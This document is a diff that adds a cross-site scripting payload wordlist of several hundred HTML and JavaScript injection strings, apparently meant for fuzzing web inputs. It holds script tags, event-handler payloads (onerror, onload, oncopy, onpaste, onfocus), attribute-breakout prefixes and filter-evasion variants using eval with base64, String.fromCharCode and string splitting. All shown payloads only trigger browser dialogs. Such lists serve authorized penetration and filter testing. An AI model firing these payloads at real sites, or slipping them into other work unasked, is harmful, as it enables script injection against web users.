@@ -1,0 +1,1204 @@
+<script>alert()</script>
+<script>confirm()</script>
+<script>prompt()</script>
+<script>alert(0)</script>
+<script>confirm(0)</script>
+<script>confirm(0);</script>
+<script>prompt(0)</script>
+<script>alert('')</script>
+<script>confirm('')</script>
+<script>prompt('')</script>
+<script>prompt('');</script>
+<script>"alert('texto')"</script>
+<script>"alert('texto');"</script>
+<script>"confirm('texto')"</script>
+<script>"prompt('texto')"</script>
+<img src=img.png onerror=alert()>
+<img src=img.png onerror=confirm()>
+<img src=img.png onerror=prompt()>
+<img src=img.png onerror=prompt();>
+<img src=img.png onerror=alert(0)>
+<img src=img.png onerror=confirm(0)>
+<img src=img.png onerror=prompt(0)>
+<img src=img.png onerror=alert('')>
+<img src=img.png onerror=confirm('')>
+<img src=img.png onerror=confirm('');>
+<img src=img.png onerror=prompt('')>
+<img src=img.png onerror="alert('texto')">
+<img src=img.png onerror="confirm('texto')">
+<img src=img.png onerror="prompt('texto')">
+<img src=img.png tabindex='0' onfocus=alert()>
+<img src=img.png tabindex='0' onfocus=confirm()>
+<img src=img.png tabindex='0' onfocus=prompt();>
+<img src=img.png tabindex='0' onfocus=prompt()>
+<img src=img.png tabindex='0' onfocus=alert(0)>
+<img src=img.png tabindex='0' onfocus=confirm(0)>
+<img src=img.png tabindex='0' onfocus=prompt(0)>
+<img src=img.png tabindex='0' onfocus=alert(//)>
+<img src=img.png tabindex='0' onfocus=confirm(//)>
+<img src=img.png tabindex='0' onfocus=prompt(//)>
+<img src=img.png tabindex='0' onblur=alert()>
+<img src=img.png tabindex='0' onblur=confirm()>
+<img src=img.png tabindex='0' onblur=prompt()>
+<img src=img.png tabindex='0' onblur=alert(0)>
+<img src=img.png tabindex='0' onblur=confirm(0)>
+<img src=img.png tabindex='0' onblur=confirm(0);>
+<img src=img.png tabindex='0' onblur=prompt(0)>
+<img src=img.png tabindex='0' onblur=alert(//)>
+<img src=img.png tabindex='0' onblur=confirm(//)>
+<img src=img.png tabindex='0' onblur=confirm(//);>
+<img src=img.png tabindex='0' onblur=prompt(//)>
+<video src="video.mp4" onloadstart=alert()></video>
+<video/src='video.mov'/controls/onerror=confirm()></video>
+<svg/onload=confirm()>
+<svg/////////////onload ='confirm()'//////>
+<input/oncut=confirm()>
+<div contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="false" oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='true' oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable onpaste=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable/onclick=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<div/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+<span contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/oncut=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='true' oncopy=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/oncopy=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="false"/onpaste=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/onpaste=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/onclick=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+<span/contenteditable='false'/onclick=confirm();<span/contenteditable='false'/oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+<p contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='true' onclick=confirm();>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+<embed src="example.pdf" type="application/pdf" onload=confirm()>
+< script>prompt(/'1/')</script >
+<svg/onload​=import()
+<svg onload="eval(atob('Y29uZmlybSgp'))"></svg>
+<svg onload="eval(String.fromCharCode(99,111,110,102,105,114,109,40,41))"></svg>
+<svg onload="(() => { eval('co' + 'nfi' + 'rm()'); })()"></svg>
+<svg onload="this['co' + 'nfi' + 'rm']()"></svg>
+<svg onload="setTimeout('confirm()', 0)"></svg>
+<svg onactivate="import('Activated!')" width="100" height="100"></svg>
+<img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+<svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+<img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+<svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+<img src="example.png" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,79,75,39,41))">
+<svg width="100" height="100" onmouseover="eval(String.fromCharCode(99,111,110,102,105,114,109,40,39,72,101,108,108,111,39,41))"></svg>
+<img src="example.png" onload="eval('ale' + 'rt' + '(' + '\'OK\'' + ')')">
+<svg width="100" height="100" onmouseover="eval('con' + 'firm' + '(' + '\'¿Seguro?\'' + ')')"></svg>
+<img src="example.png" onload="(function(x){eval(x)})('alert(\\'OK\\')')">
+<svg width="100" height="100" onmouseover="(function(x){eval(x)})('confirm(\\'¿Seguro?\\')')"></svg>
+<svg width="100" height="100" onmouseover="window['confirm']('¿Listo?')"></svg>
+<img src="example.png" onload="let f={'a':'alert','c':'confirm'};window[f['a']]('OK')">
+<svg width="100" height="100" onmouseover="let f={'a':'alert','c':'confirm'};window[f['c']]('¿Seguro?')"></svg>
+<img src="example.png" onload="(()=>{eval('alert(\\'OK\\')')})()">
+<svg width="100" height="100" onmouseover="(()=>{eval('confirm(\\'¿Seguro?\\')')})()"></svg>
+<img src="example.png" onload="setTimeout('alert(\\'OK\\')', 100)">
+<svg width="100" height="100" onmouseover="setTimeout('confirm(\\'¿Seguro?\\')', 100)">
+<img src="example.png" onload="eval(atob('ZW' + 'xh' + 'cnQoJ09LJyk='))">
+<svg width="100" height="100" onmouseover="eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,39,79,75,39,41]))"></svg>
+<object data="example.pdf" type="application/pdf" onload="alert('El objeto se cargó')"></object>
+<embed src="example.pdf" type="application/pdf" onload="confirm('¿Cargar contenido?')">
+<video controls><source src="video.mp4" type="video/mp4"><track src="subtitles.vtt" kind="subtitles" label="Español" onload="alert('Subtítulos cargados')"6></video>
+'"><script>alert()</script>
+'"><script>confirm()</script>
+'"><script>prompt()</script>
+'"><script>alert(0)</script>
+'"><script>confirm(0)</script>
+'"><script>prompt(0)</script>
+'"><script>alert('')</script>
+'"><script>confirm('')</script>
+'"><script>prompt('')</script>
+'"><script>"alert('texto')"</script>
+'"><script>"confirm('texto')"</script>
+'"><script>"prompt('texto')"</script>
+'"><img src=img.png onerror=alert()>
+'"><img src=img.png onerror=confirm()>
+'"><img src=img.png onerror=prompt()>
+'"><img src=img.png onerror=alert(0)>
+'"><img src=img.png onerror=confirm(0)>
+'"><img src=img.png onerror=prompt(0)>
+'"><img src=img.png onerror=alert('')>
+'"><img src=img.png onerror=confirm('')>
+'"><img src=img.png onerror=prompt('')>
+'"><img src=img.png onerror="alert('texto')">
+'"><img src=img.png onerror="confirm('texto')">
+'"><img src=img.png onerror="confirm('texto');">
+'"><img src=img.png onerror="prompt('texto')">
+'"><img src=img.png tabindex='0' onfocus=alert()>
+'"><img src=img.png tabindex='0' onfocus=confirm()>
+'"><img src=img.png tabindex='0' onfocus=prompt()>
+'"><img src=img.png tabindex='0' onfocus=alert(0)>
+'"><img src=img.png tabindex='0' onfocus=confirm(0)>
+'"><img src=img.png tabindex='0' onfocus=prompt(0)>
+'"><img src=img.png tabindex='0' onfocus=alert(//)>
+'"><img src=img.png tabindex='0' onfocus=confirm(//)>
+'"><img src=img.png tabindex='0' onfocus=prompt(//)>
+'"><img src=img.png tabindex='0' onblur=alert()>
+'"><img src=img.png tabindex='0' onblur=confirm()>
+'"><img src=img.png tabindex='0' onblur=prompt()>
+'"><img src=img.png tabindex='0' onblur=prompt();>
+'"><img src=img.png tabindex='0' onblur=alert(0)>
+'"><img src=img.png tabindex='0' onblur=confirm(0)>
+'"><img src=img.png tabindex='0' onblur=prompt(0)>
+'"><img src=img.png tabindex='0' onblur=alert(//)>
+'"><img src=img.png tabindex='0' onblur=confirm(//)>
+'"><img src=img.png tabindex='0' onblur=prompt(//)>
+'"><video src="video.mp4" onloadstart=alert()></video>
+'"><video/src='video.mov'/controls/onerror=confirm()></video>
+'"><svg/onload=confirm()>
+'"><svg/////////////onload ='confirm()'//////>
+'"><input/oncut=confirm()>
+'"><div contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable/oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="false"/onpaste=confirm();>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><div/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</div>
+'"><span contenteditable="true" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="true"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='true' oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='true'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="false" oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="false"/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='false' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/oncut=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="true" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="true"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='true'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="false" oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="false"/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='false' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/oncopy=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/oncopy=confirm();<span/contenteditable='false'/oncut=confirm();>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="true" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="true"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='true'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="false" onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="false"/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='false' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/onpaste=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="true" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="true"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='true'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable="false" onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable="false"/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><span/contenteditable='false'/onclick=confirm()<span/contenteditable='false'/oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</span>>D41D8CD98F00B204E9800998ECF8427E</span>
+'"><p contenteditable oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable onclick=confirm();>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='true' oncut=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='true' oncopy=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='true' onpaste=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='true' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><p contenteditable='false' onclick=confirm()>D41D8CD98F00B204E9800998ECF8427E</p>
+'"><embed src="example.pdf" type="application/pdf" onload=confirm()>
+'">< script>prompt(/'1/')</script >
+'"><svg/onload​=import()
+'"><svg onload="eval(atob('Y29uZmlybSgp'))"></svg>
+'"><svg onload="eval(String.fromCharCode(99,111,110,102,105,114,109,40,41))"></svg>
+'"><svg onload="(() => { eval('co' + 'nfi' + 'rm()'); })()"></svg>
+'"><svg onload="this['co' + 'nfi' + 'rm']()"></svg>
+'"><svg onload="setTimeout('confirm()', 0)"></svg>
+'"><svg onactivate="import('Activated!')" width="100" height="100"></svg>
+'"><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'"><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'"><img src="example.png" onload="eval(atob('YWxlcnQoJ0hhY2tlYWRvJyk='))">
+'"><svg width="100" height="100" onmouseover="eval(atob('Y29uZmlybSgnTWFuZWphJyk='))"></svg>
+'"><img src="example.png" onload="eval(String.fromCharCode(97,108,101,114,116,40,39,79,75,39,41))">
+'"><svg width="100" height="100" onmouseover="eval(String.fromCharCode(99,111,110,102,105,114,109,40,39,72,101,108,108,111,39,41))"></svg>
+'"><img src="example.png" onload="eval('ale' + 'rt' + '(' + '\'OK\'' + ')')">
+'"><svg width="100" height="100" onmouseover="eval('con' + 'firm' + '(' + '\'¿Seguro?\'' + ')')"></svg>
+'"><img src="example.png" onload="(function(x){eval(x)})('alert(\\'OK\\')')">
+'"><svg width="100" height="100" onmouseover="(function(x){eval(x)})('confirm(\\'¿Seguro?\\')')"></svg>
+'"><svg width="100" height="100" onmouseover="window['confirm']('¿Listo?')"></svg>
+'"><img src="example.png" onload="let f={'a':'alert','c':'confirm'};window[f['a']]('OK')">
+'"><svg width="100" height="100" onmouseover="let f={'a':'alert','c':'confirm'};window[f['c']]('¿Seguro?')"></svg>
+'"><img src="example.png" onload="(()=>{eval('alert(\\'OK\\')')})()">
+'"><svg width="100" height="100" onmouseover="(()=>{eval('confirm(\\'¿Seguro?\\')')})()"></svg>
+'"><img src="example.png" onload="setTimeout('alert(\\'OK\\')', 100)">
+'"><svg width="100" height="100" onmouseover="setTimeout('confirm(\\'¿Seguro?\\')', 100)">
+'"><img src="example.png" onload="eval(atob('ZW' + 'xh' + 'cnQoJ09LJyk='))">
+'"><svg width="100" height="100" onmouseover="eval(String.fromCharCode(...[99,111,110,102,105,114,109,40,39,79,75,39,41]))"></svg>
+'"><object data="example.pdf" type="application/pdf" onload="alert('El objeto se cargó')"></object>
+'"><embed src="example.pdf" type="application/pdf" onload="confirm('¿Cargar contenido?')">
+'"><video controls><source src="video.mp4" type="video/mp4"><track src="subtitles.vtt" kind="subtitles" label="Español" onload="alert('Subtítulos cargados')"6></video>
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
